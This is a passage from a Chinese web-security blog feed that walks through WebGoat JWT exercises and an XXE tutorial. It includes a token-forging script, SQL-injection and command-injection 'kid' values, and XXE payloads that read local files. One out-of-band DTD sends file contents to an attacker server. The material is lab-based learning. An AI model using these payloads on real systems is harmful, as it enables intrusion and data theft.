class="string">&#x27;\r\btry&#x27;</span>, key_, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bsorry! no key be found.&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230607191917485.png" alt="image-20230607191917485"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;WebGoat Token Builder&quot;</span>,</span><br><span class="line">  <span class="string">&quot;aud&quot;</span>: <span class="string">&quot;webgoat.org&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1686136171</span>,</span><br><span class="line">  <span class="string">&quot;exp&quot;</span>: <span class="number">1786136231</span>,   <span class="comment"># 修改jwt到期时间</span></span><br><span class="line">  <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;tom@webgoat.org&quot;</span>,</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;WebGoat&quot;</span>, <span class="comment"># 按题目要求修改名字</span></span><br><span class="line">  <span class="string">&quot;Email&quot;</span>: <span class="string">&quot;tom@webgoat.org&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Role&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;Manager&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Project Administrator&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line">,algorithm=<span class="string">&quot;HS256&quot;</span>,key=<span class="string">&quot;available&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><p>将生成的token提交即可</p><p><img src="/../images/image-20230607192326261.png" alt="image-20230607192326261"></p><h3 id="访问令牌和刷新令牌"><a href="#访问令牌和刷新令牌" class="headerlink" title="访问令牌和刷新令牌"></a>访问令牌和刷新令牌</h3><h4 id="形成原因-1"><a href="#形成原因-1" class="headerlink" title="形成原因"></a><strong>形成原因</strong></h4><p>未校验access token和refresh token是否属于同一个用户，导致A用户可使用自己的refresh token去刷新B用户的access token</p><h4 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a>实验</h4><p>WebGoat JWT 12</p><p>题目给出了Tom的旧token</p><p><img src="/../images/image-20230608205636773.png" alt="image-20230608205636773"></p><p>用jerry访问得到refresh token（密码在源码里）</p><p><img src="/../images/image-20230608205424807.png" alt="image-20230608205424807"></p><p>用jerry的refresh token 去刷新Tom的access token</p><p><img src="/../images/image-20230608210421439.png" alt="image-20230608210421439"></p><p>带上得到的accesstoken，去购物</p><p><img src="/../images/image-20230608210205494.png" alt="image-20230608210205494"></p><h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a><strong>修复</strong></h4><p>跟踪哪个access token属于哪个refresh token,还可以检查用户的IP地址或地理位置。</p><h3 id="旧JWT复用"><a href="#旧JWT复用" class="headerlink" title="旧JWT复用"></a>旧JWT复用</h3><p>还是WebGoat JWT 12</p><p><img src="/../images/image-20230607193350002.png" alt="image-20230607193350002"></p><p><img src="/../images/image-20230607193221271.png" alt="image-20230607193221271"></p><h3 id="KID注入"><a href="#KID注入" class="headerlink" title="KID注入"></a>KID注入</h3><p>WebGoat JWT 13</p><p>查看对应源码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span>Jwts.parser().setSigningKeyResolver(<span class="keyword">new</span> <span class="title class_">SigningKeyResolverAdapter</span>() &#123;</span><br><span class="line">                        xxxxxxx</span><br><span class="line">                    &#125;).parseClaimsJws(token);</span><br><span class="line"><span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> (Claims) jwt.getBody();</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> (String) claims.get(<span class="string">&quot;username&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;Jerry&quot;</span>.equals(username)) &#123;</span><br><span class="line">    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-final-jerry-account&quot;</span>).build();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;Tom&quot;</span>.equals(username)) &#123;</span><br><span class="line">    <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-final-not-tom&quot;</span>).build();</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-invalid-token&quot;</span>).output(e.toString()).build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑：获取密钥，然后解析token，获得claims中的username，如果为Tom则删除成功。</p><p><strong>关键</strong>：获取密钥的部分</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">SigningKeyResolverAdapter</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] resolveSigningKeyBytes(JwsHeader header, Claims claims) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">kid</span> <span class="operator">=</span> (String) header.get(<span class="string">&quot;kid&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">var</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection()) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 通过查询kid来获得key，很明显存在sql注入</span></span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span>connection.createStatement().executeQuery(<span class="string">&quot;SELECT key FROM jwt_keys WHERE id = &#x27;&quot;</span> + kid + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">      </span><br><span class="line">            <span class="keyword">while</span> (rs.next()) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 返回base64解码后的key</span></span><br><span class="line">            <span class="keyword">return</span> TextCodec.BASE64.decode(rs.getString(<span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">catch</span> (SQLException e) </span><br><span class="line">        &#123;</span><br><span class="line">            errorMessage[<span class="number">0</span>] = e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常的思路是通过对kid参数进行sql注入，伪造key</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> key <span class="keyword">FROM</span> jwt_keys <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;&quot; + kid + &quot;&#x27;</span></span><br></pre></td></tr></table></figure><p>因为Tom的jwt中kid为<code>webgoat_key</code>，说明在jwt_keys表中有一个id的值为<code>webgoat_key</code>。</p><p>所以可以对kid注入</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kid: y<span class="string">&#x27; and 1=2 union select id from jwt_keys where id =&#x27;</span>webgoat_key</span><br></pre></td></tr></table></figure><p>这样sql查询的结果就为<code>webgoat_key</code>，即key为<code>webgoat_key</code>，但是因为</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TextCodec.BASE64.decode(rs.getString(<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>无法对<code>webgoat_key</code>进行base64解码，就会抛出异常。</p><p>用<code>webgoat_key</code>作为key</p><p><img src="/../images/image-20230608204646391.png" alt="image-20230608204646391"></p><p>通过源码得到真正的key为</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = base64.b64decode(<span class="string">&quot;qwertyqwerty1234&quot;</span>)</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># payload</span></span><br><span class="line">token_dict = &#123;</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: <span class="number">1529569536</span>,</span><br><span class="line">    <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;WebGoat Token Builder&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="number">2018905304</span>,</span><br><span class="line">    <span class="string">&quot;aud&quot;</span>: <span class="string">&quot;webgoat.org&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;jerry@webgoat.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;Tom&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Email&quot;</span>: <span class="string">&quot;jerry@webgoat.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Role&quot;</span>: [<span class="string">&quot;Cat&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">key = base64.b64decode(<span class="string">&quot;qwertyqwerty1234&quot;</span>)</span><br><span class="line"><span class="comment"># headers</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>,</span><br><span class="line">    <span class="comment"># &quot;kid&quot;: &quot;123&#x27; and 1=2 union select id FROM jwt_keys WHERE id=&#x27;webgoat_key&quot;,</span></span><br><span class="line">    <span class="string">&quot;kid&quot;</span>: <span class="string">&quot;webgoat_key&quot;</span>,</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 调用jwt库,生成json web token</span></span><br><span class="line">jwt_token = jwt.encode(payload=token_dict,  <span class="comment"># payload, 有效载体</span></span><br><span class="line">                       key=key,  <span class="comment"># 进行加密签名的密钥</span></span><br><span class="line">                       algorithm=<span class="string">&quot;HS256&quot;</span>,  <span class="comment"># 指明签名算法方式, 默认也是HS256</span></span><br><span class="line">                       headers=headers  <span class="comment"># json web token 数据结构包含两部分, payload(有效载体), headers(标头)</span></span><br><span class="line">                       ).decode(<span class="string">&#x27;ascii&#x27;</span>)  <span class="comment"># python3 编码后得到 bytes, 再进行解码(指明解码的格式), 得到一个str</span></span><br><span class="line"><span class="built_in">print</span>(jwt_token)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230608204947847.png" alt="image-20230608204947847"></p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>选择哪种方法，取决于后端是如何利用kid来找到对应密钥</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">#目录遍历</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span> : <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kid&quot;</span> : <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">#sql注入</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span> : <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kid&quot;</span> : <span class="string">&quot;aaaaaaa&#x27; UNION SELECT &#x27;key&#x27;;-- &quot;</span></span><br><span class="line">#命令执行</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span> : <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kid&quot;</span> : <span class="string">&quot;/path/to/key_file|whoami&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="签名算法更改为对称加密"><a href="#签名算法更改为对称加密" class="headerlink" title="签名算法更改为对称加密"></a>签名算法更改为对称加密</h3><p>JWT中最常用的两种算法为<code>HMAC</code>和<code>RSA</code></p><blockquote><p>HMAC(HS256):是一种对称加密算法，使用秘密密钥对每条消息进行签名和验证<br>RSA(RS256)：是一种非对称加密算法，使用私钥加密明文，公钥解密密文。</p></blockquote><p>如果对方网站原来使用的是RS256，但是泄露了公钥，我们可以使用该公钥生成签名，并且将alg的值改为HS256，因为HS256为对称加密算法，所以网站就会使用该公钥验证签名，自然签名可以通过验证。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://jwt.io/introduction">https://jwt.io/introduction</a></p><p><a href="http://www.xianxianlabs.com/blog/2018/06/03/96.html">http://www.xianxianlabs.com/blog/2018/06/03/96.html</a></p><p><a href="https://www.freebuf.com/vuls/216457.html">https://www.freebuf.com/vuls/216457.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XXE</title>
      <link href="/2023/06/01/Web%E5%AE%89%E5%85%A8%E4%B9%8BXXE/"/>
      <url>/2023/06/01/Web%E5%AE%89%E5%85%A8%E4%B9%8BXXE/</url>
      
        <content type="html"><![CDATA[<h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><ol><li><p>定义</p><blockquote><p>XML是可扩展标记语言（eXtensible Markup Language）的缩写，它是是一种数据表示格式，可以描述非常 复杂的数据结构，常用于传输和存储数据。</p></blockquote></li><li><p>与html的联系和区别</p><ul><li>HTML 被设计用来显示数据</li><li>XML 被设计用来传输和存储数据</li></ul><blockquote><p>对 XML 最好的描述是：</p><p><strong>XML 是独立于软件和硬件的信息传输工具。</strong></p></blockquote></li><li><p>语法</p><p><img src="/../images/image-20220804165043284-1686034515882.png" alt="image-20220804165043284"></p></li><li><p>格式</p><ul><li><p>XML声明：版本，编码信息（可选，如果存在就必须放在文档的首行）</p></li><li><p>DTD:Document Type Definition 即文档类型定义 (可选)</p></li><li><p>文档元素</p></li><li><p>典型xml文档例子</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> <span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--DTD，这部分可选的--&gt;</span>          </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804155703432-1686034515883.png" alt="image-20220804155703432"></p></li></ul></li></ol><h2 id="DTD与实体"><a href="#DTD与实体" class="headerlink" title="DTD与实体"></a>DTD与实体</h2><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><blockquote><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY b &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>上面所示的就是一个DTD</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">    &lt;!ENTITY b system &quot;外部dtd地址&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>上面所示的就是一个外部DTD</p><h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><blockquote><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY hello &quot;hello world&quot; &gt; </span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;foo&gt;&amp;hello&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>文档元素可以使用&amp;来引用实体的值，<code>&amp;hello</code>将被替换为<code>hello world</code></p><h4 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h4><p>XML参数实体是一种特殊的XML实体，只能在DTD中的其他地方引用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY % b &quot;&lt;!ENTITY b1 &quot;awsl&quot;&gt;&quot;&gt;</span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>可以看到参数实体用<code>% name</code>声明，引用时用<code>%name;</code></p><h4 id="引入外部实体"><a href="#引入外部实体" class="headerlink" title="引入外部实体"></a>引入外部实体</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; </span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>这里使用了file协议来引入外部实体，实际上还能支持如下协议，这也是xxe漏洞形成的原因</p><p><img src="/../images/1270588-20200115235522292-2141935835.png" alt="img"></p><p><img src="/../images/20181120002647-e965b74c-ec17-1.png" alt="20181120002647-e965b74c-ec17-1"></p><h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>XXE 漏洞全称 XML External Entity Injection，即 xml 外部实体注入漏洞</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>XXE 漏洞发 生在<strong>应用程序解析 XML 输入时</strong>，没有禁止<strong>外部实体</strong>的加载，而外部实体的引用可支持http，file等协议，通过利用这些协议进行攻击。</p><p><img src="/../images/1270588-20200115235522292-2141935835.png" alt="img"></p><p><img src="/../images/20181120002647-e965b74c-ec17-1.png" alt="20181120002647-e965b74c-ec17-1"></p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h3 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h3><ul><li><p>数据包中的content-type</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">application/xml</span><br><span class="line">text/xml</span><br></pre></td></tr></table></figure></li><li><p>http body</p><p><img src="/../images/image-20230605180133052-1686034648311.png" alt="image-20230605180133052"></p></li><li><p>数据包请求头中Context-Type的值为application&#x2F;json，更改为application&#x2F;xml或者text&#x2F;xml，然后插入payload测试</p></li></ul><h3 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">simplexml_import_dom</span>()</span><br></pre></td></tr></table></figure><p>需要注意的是PHP是使用libxml来解析XML的，但是<strong>libxml2.9.0</strong>开始就默认不解析外部实体，自然就不存在xxe漏洞。</p><h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilder</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">javax.xml.parsers.SAXParserFactory</span><br><span class="line">javax.xml.transform.TransformerFactory</span><br><span class="line">javax.xml.validation.Validator</span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory</span><br><span class="line">javax.xml.transform.sax.SAXSource</span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">org.xml.sax.helpers.XMLReaderFactory</span><br><span class="line">org.dom4j.io.SAXReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XpathExpression</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.apache.commons.digester3.Digester</span><br></pre></td></tr></table></figure><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件读取</span><br><span class="line">内网探针</span><br><span class="line">拒绝服务攻击</span><br><span class="line">命令执行</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul><li><a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a> php版本</li><li>vulhub Apache solr XML 实体注入漏洞（CVE-2017-12629）</li></ul><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p>Demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>username</code>为回显位</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; </span><br><span class="line">]&gt;                                                         </span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><h4 id="外带"><a href="#外带" class="headerlink" title="外带"></a>外带</h4><p>php:&#x2F;&#x2F;filter读取对方服务器文件内容→引入外部实体（攻击服务器上的）→触发外部实体中的写入代码，将读取到的文件内容赋值给指定参数→接收参数，在攻击服务器监听或者查看日志，从而获取到对方服务器文件内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///e:/test.txt&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://ip:8000/test.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--test.dtd--&gt;</span><br><span class="line">&lt;!ENTITY % payload</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://ip:8888/?data=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure><blockquote><p>注意：test.dtd的内容，内部的%号要进行实体编码成&amp;#x25（因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code>）</p></blockquote><p><img src="/../images/image-20230605192212337.png" alt="image-20230605192212337"></p><h4 id="基于报错"><a href="#基于报错" class="headerlink" title="基于报错"></a>基于报错</h4><p>构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。</p><h5 id="引入服务器实体"><a href="#引入服务器实体" class="headerlink" title="引入服务器实体"></a>引入服务器实体</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % xxe SYSTEM &quot;http://ip:8000/xml.dtd&quot;&gt; </span><br><span class="line">    %xxe;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>xml.dtd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--通过执行error实体，以便通过尝试加载不存在的文件来带出目标文件的值，从而生成包含不存在文件的名称的错误消息，该文件是/etc/passwd文件的内容--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230606142023880.png" alt="image-20230606142023880"></p><h5 id="引入本地系统文件–测试失败"><a href="#引入本地系统文件–测试失败" class="headerlink" title="引入本地系统文件–测试失败"></a>引入本地系统文件–测试失败</h5><p><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:/Windows/System32/wbem/xml/cim20.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % SuperClass &#x27;</span><br><span class="line">         &gt;Your DTD code&lt;!ENTITY test &quot;test&quot;</span><br><span class="line">        &#x27;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>DTD 